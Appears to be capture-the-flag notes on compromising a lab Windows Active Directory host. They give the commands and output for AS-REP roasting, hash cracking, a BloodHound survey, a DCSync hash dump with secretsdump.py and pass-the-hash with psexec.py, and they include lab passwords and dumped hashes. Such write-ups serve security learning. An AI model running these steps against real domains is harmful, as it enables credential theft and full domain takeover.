#windows #active-directory #ASREPRoast

# Nmap 
```shell
# Nmap 7.94SVN scan initiated Wed Sep  4 08:33:32 2024 as: nmap -sC -sV -oA nmap/sauna --min-rate=1000 -T5 10.129.235.182
Nmap scan report for 10.129.235.182
Host is up (0.076s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Egotistical Bank :: Home
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-09-04 20:33:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-09-04T20:33:47
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h00m00s

```


> found usernames from /about.html
> used username-anarchy to generate ldaps then used the GetNPusers.py to check for users that lacks kerberos pre-authentication

```shell
python GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile ldap.txt -format hashcat -outputfile hashes.asreproast
```

> found a hash of the user fsmith
```shell
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:702b7753f243144a1255a331ba7e2d64$3a0931d2ca76261eeebf3c6c7126697b0b8bc8b85c69fccba885c7f53a19e555f39eb952cb4b51ab12c410b180b85f3f4b77ad8b0f8104e894d45b4a08ec9df7216dc6585c85cf698bc6b251d2a4056b36ea27e33a854bb607b28cedafeb22ac0a600dbd8f5078f46f0c988ffff0c0893c14543b5cab4c8ecc62131c8c0019f7ba0fead16a355e3001072707b0c6f954e44e9b1bf292178114c74b8c55c0e95f771e56a9dee0b7b929f133a4c358fa8f9951413af2b1cde518acbffdb651eca7dbd8227dde335b278b8c6ceb4e70682478c15015d0fa39a6c3531654a4c95d715edb64ebd4d736698f7fae6c491b4781b9d6898ff8790577a152c389682089b5
```

> cracked the password using hashcat fsmith:Thestrokes23, used rockyou as wordlist

`hashcat -m 18200 -a 0 hashes.asreproast /usr/share/wordlists/rockyou.txt --show`

> used evil-winrm to remotely access the machine, got the user flag

> executed winpeas, found credentials

```powershell
 DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!

```


> Had to look at a video walkthrough to perform bloodhound to look for exploits in the AD environment 
> 
> Downloaded `SharpHound.exe` to map out AD environment, then dragged the zip file onto bloodhound 


```powershell
upload SharpHound.exe
./SharpHound.exe
download <Generated_ZIP_file>
```


> has `GetChanges` rights, *Help* context menu shows an abuse using secretdumps.py

`secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.235.182'`

> it displays account hashes

```shell
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:7a2965077fddedf348d938e4fa20ea1b::: [*] Kerberos keys grabbed Administrator:aes256-cts-hmac-sha1-96:987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031 Administrator:aes128-cts-hmac-sha1-96:145e4d0e4a6600b7ec0ece74997651d0 Administrator:des-cbc-md5:19d5f15d689b1ce5 krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24 krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9 krbtgt:des-cbc-md5:c170d5dc3edfc1d9
```

> used `psexec.py` to access admin account using the hash, gained administrator access